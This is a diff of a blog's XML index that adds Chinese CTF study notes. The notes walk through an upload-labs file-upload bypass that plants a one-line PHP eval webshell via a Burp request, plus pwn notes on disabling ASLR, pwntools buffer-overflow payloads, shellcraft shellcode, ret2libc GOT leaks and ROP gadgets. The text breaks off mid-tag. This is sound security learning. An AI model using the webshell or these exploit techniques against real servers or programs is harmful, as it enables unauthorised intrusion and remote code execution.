@@ -61,6 +61,19 @@
   
   
   <entry>
+    <title>【ctf题目系列】upload-labs靶场 web 文件上传漏洞</title>
+    <link href="/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs">upload-labs github链接</a></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p><a href="https://cloud.tencent.com/developer/article/2196769">phpStudy 2016搭建-upload-labs靶场</a></p><h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><p>直接在浏览器源代码的位置修改不成功，所以选择在burp上进行尝试<br>将shell.php改为shell.png，上传该png图片，用burp拦截<br>修改filename为shell.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.20.201<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>317<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.20.201<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryeHo9xtvBYEh3wzgK<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.20.201/Pass-01/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=node01ked3r2wvuewui081fs0tsx7517.node0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传</span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK--</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【ctf学习系列】WebShell与文件上传漏洞</title>
     <link href="/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
@@ -99,20 +112,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【ctf】安全机制</title>
     <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
     <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
     
     <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX 即 No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><p>windows：DEP<br>linux：NX</p>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -139,20 +144,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【ctf题目系列】自定义</title>
     <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
     <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/</url>
     
     <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -m32 -fno-stack-protector stack_example.c -o stack_example<br></code></pre></td></tr></table></figure><p><code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。<br>如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR</p>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -179,20 +176,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【ctf系列】pwn exp常用函数解析</title>
     <link href="/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/"/>
     <url>/2023/08/18/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%20exp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/</url>
     
     <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure><p>sendlineafter  当收到第一个参数之后，就发送第二个参数+&#x2F;n输出</p><h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>是用来填充垃圾数据的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt;&gt; from pwn import *<br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(60)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa&#x27;</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt; cyclic(0x16 + 8)<br>b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaaha&#x27;</span><br>&gt;&gt;&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *         <span class="hljs-comment"># 用于创建与二进制文件进行交互的脚本。它提供了许多用于漏洞利用的功能。 </span><br>p=process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)  <span class="hljs-comment"># 这创建了一个新的进程，执行名为 `ret2libc3` 的可执行文件。这通常用于在本地系统上调试和测试漏洞利用脚本。</span><br>elf=ELF(<span class="hljs-string">&#x27;ret2libc3&#x27;</span>)      <span class="hljs-comment"># 这将二进制文件 `ret2libc3` 加载到一个对象 `elf` 中，以便可以从中获取有关二进制文件的信息，例如函数地址、GOT（Global Offset Table）等。</span><br>put_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]   <span class="hljs-comment"># 获取了在二进制文件的 PLT 表中 `puts` 函数的地址。</span><br>put_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
     
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-      <category>unsupported</category>
-      
-    </categories>
     
     
   </entry>
@@ -257,20 +246,12 @@
   
   
   <entry>
-    <title></title>
+    <title>【ctf系列】pwn学习</title>
     <link href="/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/"/>
     <url>/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/</url>
     
     <content type="html"><![CDATA[<p><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></p><p>b站视频教程：<a href="https://www.bilibili.com/video/BV1mb411R7LR/?p=92&spm_id_from=pageDriver&vd_source=504b7dbe5398664dd37d144b1bdfc0a1">【CTF系列教程100集】2023年我在B站学CTF，国内顶级战队大佬带你从入门到精通，零基础小白必看！！！</a></p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc ip port<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814203631.png" alt="image.png"></p><p>攻击脚本按照一定的方式发送一个payload</p><p>磁盘中的才叫ELF<br>file a.out是一个ELF文件</p><p>节视图 划分功能<br>段视图 划分执行权限的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814210726.png" alt="image.png"></p><p>rodata   read only data<br>cat &#x2F;proc&#x2F;pid&#x2F;maps    proc表示process</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211056.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211232.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211647.png" alt="image.png"></p><p>gdb调的是虚拟内存</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814212047.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814214700.png" alt="image.png"><br>BSS：未初始化的全局变量  不需要占用磁盘空间 需要占据内存空间</p><p>pwn的实战中大段序一般不多</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814220115.png" alt="image.png"></p><p>eax：e表示extra    </p><p>LSB小端序</p><p>fork 另起了一个新的进程  </p><p>取值-译码-执行</p><p>偏移和位移 </p><p>汇编  DEST &lt;- DEST SRC ？</p><p>checksec xxx</p><p>gdb xxx<br>vmmap</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>mov ebp esp<br>mov esp ebp<br>把esp的值给ebp</p><p>eax保存返回地址</p><p>call指令自带填入返回地址</p><p>ret 指令 ？</p><p>pwntools  python的一个模块<br>gdb中的插件：peda gef pwndbg<br>checksec a.out 命令行工具</p><p>IDA软件：</p><p>LibcSearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&quot;./xxx&quot;</span>)<br>io=remote(<span class="hljs-string">&quot;ip地址&quot;</span>， 端口)<br><br>io.recvline()<br>io.recv()<br><br>io.send(p64())<br>io.send(p32(<span class="hljs-number">0</span>))<br>io.send(<span class="hljs-string">b&quot;\x0a&quot;</span>) <span class="hljs-comment"># byte对象</span><br>io.sendline(<span class="hljs-string">b&quot;abcd&quot;</span>)   &lt;=&gt; io.send(<span class="hljs-string">b&quot;abcd\n&quot;</span>) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(-x8048522)<br>io.sendline(payload) <br>io.interactive()<br></code></pre></td></tr></table></figure><p>ret2text 返回到test段</p><p>checksec执行结果：<br>NX：栈可执行</p><p>setbuf(stdin,0) 关闭缓冲区，可以将输入的字符串直接打印出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b *0x8048<br>pwndbg&gt; b main<br>pwndbg&gt; r <span class="hljs-comment"># run</span><br>pwndbg&gt; s <span class="hljs-comment"># stag in?</span><br>pwndbg&gt; n<br>AAAAA<br>pwndbg&gt; stack 24<br>pwndbg&gt; vmmap<br>pwndbg&gt; <br>pwndbg&gt; <br><br></code></pre></td></tr></table></figure><p>栈的保护机制：<br>ASLR 地址随机化<br>NX<br>canary</p><p>获取shellcode的方法：<br>1）pwn有模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.sh() <span class="hljs-comment"># 32位机器</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(shellcraft.sh())   <span class="hljs-comment"># 输出汇编</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(asm(shellcraft.sh())) <span class="hljs-comment"># 转成二进制</span><br><br><span class="hljs-comment">########################################  64位</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.amd64.sh() <span class="hljs-comment"># 64位机器</span><br></code></pre></td></tr></table></figure><p>leave   表示把esp移到ebp的位置<br>pop<br>ret ???????&#x2F;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0x1111111</span> - <span class="hljs-number">0x000123</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(xxxx)<br><br>ljust 从左向右有调整，不够位数的用字符补齐<br>asm(shellcraft.sh()).ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + P32(0xxxxxxxxx)<br></code></pre></td></tr></table></figure><h2 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xd0</span>-<span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>ROP   是因为没有一个现成的函数可供调用，所以需要自己构造</p><p>ida   在汇编那个区域 输入G，然后输入地址，直接就能跳转<br>ida shift+F12 跳到字符串</p><p>ret等效于 pop EIP<br>xor %eax, %eax 将eax清空<br>mov %eax, (%edx)   加%是后者给前者赋值</p><h3 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817134717.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-pie -o xx test.c<br>gcc -fno-pie --static -o xx test.c<br><br>gcc -fno-pie  -g -m32 -o xx test.c<br><span class="hljs-comment"># fno-pie 关闭32</span><br><span class="hljs-comment"># -g 加上源代码</span><br><span class="hljs-comment"># -m32 编译成32位</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133627.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133659.png" alt="image.png"></p><p>静态链接文件较大   静态文件和动态文件大小差距在于库函数</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817135253.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; plt<br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br></code></pre></td></tr></table></figure><h2 id="day4"><a href="#day4" class="headerlink" title="day4"></a>day4</h2><p>plt在代码段<br>got     global offset table</p><p>ret2text   找后门函数<br>ret2shellcode<br>ret2syscall二进制用的是静态链接   静态 将库函数写到了elf文件本身  代码会比较多 就可以很容易的构成一个攻击流<br>ret2libc plt表中存在system，很有利</p><p>plt是一个表，表里面保存的是代码<br>got.plt里面保存的是数据，里面保存的是地址</p><p>假设<br>0xaaaaaaaa      system@got</p><p>32是栈传递 64是寄存器调用</p><p>system(“&#x2F;bin&#x2F;sh”)   &#x2F;bin&#x2F;sh是存放到rodata地方</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817211753.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212348.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212234.png" alt="image.png"></p><p>-fno-stack</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">关闭保护 canary fno-stack-protector ？？？<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212726.png" alt="image.png"></p><p>nop使得ASLR打开之后栈溢出执行成为可能</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214704.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214722.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817215102.png" alt="image.png"><br>上图的ebp是system函数自己push进去的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221409.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221553.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222300.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222329.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222944.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222441.png" alt="image.png"></p><p>下面为：只有system函数，没有&#x2F;bin&#x2F;sh字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817230223.png" alt="image.png"></p><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>除了给可执行文件，还给了libc.so</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817231857.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817232013.png" alt="image.png"><br>fflush()清理缓冲区<br>read(0, &amp;buf, 0xAu)   0表示标准输入</p><h2 id="day5"><a href="#day5" class="headerlink" title="day5"></a>day5</h2><p>ret2text  代码中没有后门函数<br>ret2shellcode  checksec看没有RWE相关的东西<br>ret2libc1 既有system，又有 &#x2F;bin&#x2F;sh<br>ret2libc2 只有system   自己输入&#x2F;bin&#x2F;sh<br>ret2libc3  还给了一个libc.so文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223114.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223647.png" alt="image.png"></p><p>泄露got表中put函数的地址，从libc中找到puts函数和system函数的距离，就可以算出system函数的地址了</p><p>泄露got表中put函数的地址方法：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224227.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224333.png" alt="image.png"></p><p>打印了好多东西，这些东西是put函数执行的，所以put函数已经执行过了，got表里面就有值了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224614.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818225432.png" alt="image.png"></p><p>ida中找不到&#x2F;bin&#x2F;sh和sh，可以用strings找个含有sh的字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230016.png" alt="image.png"></p><p>整体的攻击脚本：<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230201.png" alt="image.png"></p><p>sendlineafter  当收到第一个参数之后，就发送第二个参数+&#x2F;n输出</p><p>cyclic是用来填充垃圾数据的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818231237.png" alt="image.png"></p><h3 id="课后题1：ret2text"><a href="#课后题1：ret2text" class="headerlink" title="课后题1：ret2text"></a>课后题1：ret2text</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232343.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232502.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232528.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232553.png" alt="image.png"></p><h3 id="课后题2：ret2shellcode"><a href="#课后题2：ret2shellcode" class="headerlink" title="课后题2：ret2shellcode"></a>课后题2：ret2shellcode</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233129.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233201.png" alt="image.png"><br>ASLR，不知道写到栈上的地址是什么？所以题目就告诉了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233457.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233544.png" alt="image.png"></p><p>nop</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233733.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233756.png" alt="image.png"></p><p>asm是把汇编代码变成机器码</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233930.png" alt="image.png"></p><h3 id="课后题3：ret2libc-system有-x2F-bin-x2F-sh也有"><a href="#课后题3：ret2libc-system有-x2F-bin-x2F-sh也有" class="headerlink" title="课后题3：ret2libc  system有 &#x2F;bin&#x2F;sh也有"></a>课后题3：ret2libc  system有 &#x2F;bin&#x2F;sh也有</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234215.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234115.png" alt="image.png"></p><p>有了system，在plt表里面有个表项目</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234143.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234227.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234418.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234442.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234646.png" alt="image.png"></p><p>daedbeef是垃圾数据</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234757.png" alt="image.png"></p><h3 id="课后题4：x64"><a href="#课后题4：x64" class="headerlink" title="课后题4：x64"></a>课后题4：x64</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235157.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235814.png" alt="image.png"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&quot;pop|ret&quot;</span> | <span class="hljs-string">grep</span> <span class="hljs-string">rsi</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000233.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000402.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000714.png" alt="image.png"></p><p>return 将栈顶的值指向rip    </p><p>rip：pop_rdi_ret</p><p>rdi： &#x2F;bin&#x2F;sh<br>rip: system</p><p>system取rdi中的参数，执行system(“&#x2F;bin&#x2F;sh”)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819001126.png" alt="image.png"><br>都是先传参，再调用函数</p><h3 id="64位ROP小技巧-csu-不是一个完整的攻击，只是ROP中间的一个技巧"><a href="#64位ROP小技巧-csu-不是一个完整的攻击，只是ROP中间的一个技巧" class="headerlink" title="64位ROP小技巧 csu(不是一个完整的攻击，只是ROP中间的一个技巧)"></a>64位ROP小技巧 csu(不是一个完整的攻击，只是ROP中间的一个技巧)</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819004149.png" alt="image.png"></p><p>jz z是1就jump z是0就向下执行</p><h3 id="课后题5："><a href="#课后题5：" class="headerlink" title="课后题5："></a>课后题5：</h3><p><img 